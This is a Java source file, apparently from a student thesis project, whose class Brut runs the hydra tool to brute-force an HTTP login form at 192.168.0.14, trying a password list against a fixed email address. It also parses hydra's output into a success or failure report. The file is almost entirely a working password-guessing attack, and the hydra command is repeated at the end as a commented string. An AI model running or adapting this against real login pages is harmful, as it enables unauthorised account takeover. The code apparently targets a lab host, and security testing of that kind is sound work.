package com.example.demo1;

import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;


public class Brut {
    public static String brut(Path t){
        String inf = "";
        Process p;
        String s, not,l = "Brute-force \n";
        Integer line=0;
        StringBuilder lines;
        try {
            // FileWriter writer = new FileWriter("notepad1.txt");
            //Path t = Paths.get("/home/kali/Documents/notepad1");
            p = Runtime.getRuntime().exec(new String[]{
                    "hydra", "-l", "DR@mail.ru", "-P", "/home/kali/Documents/Java/Diplom/out/production/Diplom/Fail/Passwords"
                    , "192.168.0.14", "http-post-form",
                    "/auth:email=^USER^&password=^PASS^:Неверно введены Email или пароль."
            });
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null){

                if (s.contains("1 of 1") == true) {
                    //System.out.println("::" + s);
                    l +=":: " + s + "\n";
                    l +="Brute force: Successfully\n";
                }
                if (s.contains("[DATA]") == true) {
                    lines = new StringBuilder(s);
                    lines.replace(0,7,"");
                    l += ":: " + lines + "\n";
                }
                if (s.contains("login") == true && s.contains("host") == true) {
                   // System.out.println("::" + s);
                    l +=":: " + s + "\n";

                }
                Files.write(t, l.getBytes());
                line++;
                if(line == 30){
                   not = "Brute force: Unsuccessfully";
                    System.out.println(not);
                    Files.write(t, not.getBytes());
                }
                // writer.write("Пароль для пользователя не был подобран, но возможность взлома существует");
            }
            p.waitFor();
            //writer.write("exit: " + p.exitValue());
            p.destroy();
        } catch (Exception e ) {}

        return inf;
    }
}




//s = "hydra -l DR@mail.ru -P /home/kali/Documents/Java/Diplom/out/production/Diplom/Fail/Passwords 192.168.0.14 http-post-form \"/auth:email=^USER^&password=^PASS^:Неверно введены Email или пароль.\"";


